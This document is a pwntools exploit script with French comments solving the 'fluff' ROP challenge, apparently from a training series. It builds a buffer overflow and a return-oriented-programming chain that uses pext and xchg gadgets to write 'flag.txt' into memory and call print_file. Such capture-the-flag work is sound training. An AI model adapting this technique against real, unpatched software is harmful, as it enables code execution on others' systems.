from pwn import *

# But de la ROP chain : appeler print_file("flag.txt"). 
#
# Chaîne absente du binaire donc il faut l'écrire en mémoire.
# fluff n'a pas de gadget d'écriture simple : on fabrique chaque octet avec pext
# 
# pext edx, ebx, eax : garde les bits de ebx=0xb0bababa choisis par le masque eax
# Ensuite on l'écrit avec xchg byte ptr [ecx], dl.
#
# Voir les challenges précédents si besoin (celui-là est le n°6)

context.bits = 32
elf = ELF("./fluff")

pext = p32(0x08048543)
# objdump -d ./fluff | grep -A30 questionableGadgets
# => mov eax, ebp ; mov ebx, 0xb0bababa ; pext edx, ebx, eax ; mov eax, 0xdeadbeef ; ret
#    eax = masque (vient de ebp), ebx = source figée, edx = octet extrait (dans dl)

ecriture = p32(0x08048555)
# => 0x08048555 : xchg byte ptr [ecx], dl ; ret   (écrit dl dans [ecx])

pop_ecx = p32(0x08048558)
# => 0x08048558 : pop ecx ; bswap ecx ; ret (charge l'adresse de destination, byte-swappée)

pop_ebp = p32(0x080485bb)
# ROPgadget --binary ./fluff | grep "pop ebp"
# => 0x080485bb : pop ebp ; ret   (met le masque dans ebp -> eax via le gadget pext)

section_data = 0x0804a018
# gdb-peda$ maintenance info sections   (zone .data inscriptible)

print_file = p32(elf.plt["print_file"])

SRC = 0xb0bababa # source figée du pext (dans le gadget)

# --- Masque pext pour produire un octet donné -------------------------------
# pext tasse, du bit 0 vers le haut, les bits de SRC sélectionnés par le masque.
# Pour chaque bit voulu de l'octet (LSB d'abord), on prend la prochaine position
# de SRC qui a la bonne valeur et on l'active. Résultat : les 8 bits bas de edx.
def find_mask(target):
    mask, pos = 0, 0
    for out_bit in range(8):
        want = (target >> out_bit) & 1
        while pos < 32 and ((SRC >> pos) & 1) != want:
            pos += 1
        if pos >= 32:
            raise ValueError("aucun masque pour l'octet 0x%02x" % target)
        mask |= (1 << pos)
        pos += 1
    return mask

payload = b'A' * 44
# Obtention du 44 : msf-pattern_create / msf-pattern_offset

for i, c in enumerate(b"flag.txt"):
    payload += pop_ebp + p32(find_mask(c))                    # ebp = masque
    payload += pext                                           # dl = octet (pext sur 0xb0bababa)
    payload += pop_ecx + p32(section_data + i, endian="big")  # ecx = addr (bswap)
    payload += ecriture                                       # xchg [ecx], dl -> écrit l'octet

payload += print_file
payload += p32(0xdeadbeef)
payload += p32(section_data)

p = process("./fluff")
p.send(payload)
print(p.recvall().decode('utf-8'))
